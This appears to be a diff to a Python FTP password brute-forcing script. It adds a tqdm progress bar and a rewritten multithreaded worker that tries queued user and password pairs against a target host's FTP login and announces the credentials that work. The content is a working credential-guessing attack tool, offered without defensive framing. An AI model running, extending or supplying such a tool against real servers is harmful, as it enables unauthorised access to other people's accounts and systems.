@@ -3,6 +3,8 @@ import argparse
 import threading
 from  queue import Queue, Empty
 from itertools import product
+from tqdm import tqdm
+
 
 
 
@@ -31,6 +33,10 @@ userfile = args.userfile
 threads = args.threads if args.threads else 20
 
 combo_queue = Queue()
+
+progress = None
+progress_lock = threading.Lock()
+
 
 
 if not args.user and not args.userfile:
@@ -124,7 +130,43 @@ event_done = threading.Event()
 trueuser = None
 truepasswd = None
 
+
+
 def workers():
+    global trueuser, truepasswd
+    while not event_done.is_set():
+        try:
+            user, password = combo_queue.get_nowait()
+        except Empty:
+            break
+
+        if event_done.is_set():
+            break
+
+        try:
+            with ftplib.FTP() as serve:
+                serve.connect(host,21,timeout=5)
+                serve.login(user,password)
+
+                print("\n===========================================================================\n")
+                print(" The Password was Found and Connection was Success\n")
+                print(f"Connect with {host} as {user}  :   {password}\n")
+                trueuser = user
+                truepasswd = password
+                event_done.set()
+                break
+
+        except Exception:
+            pass  # silent fail or optional print
+
+        # ✅ Update progress bar
+        with progress_lock:
+            progress.update(1)
+
+
+
+
+'''def workers():
     global trueuser, truepasswd
     while not event_done.is_set() and not combo_queue.empty():
         try:
@@ -150,7 +192,7 @@ def workers():
         
         except Exception as e:
             print(f"Connection failed with {user}  :   {password}")
-
+'''
 
 
 
@@ -161,13 +203,15 @@ for _ in range(threads):
     t= threading.Thread(target=workers)
     t.start()
     thread_list.append(t)
+    
+
 
 
 
 for t in thread_list:
     t.join()
 
-
+progress.close()
 
 print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
 print("===========================================================================\n")
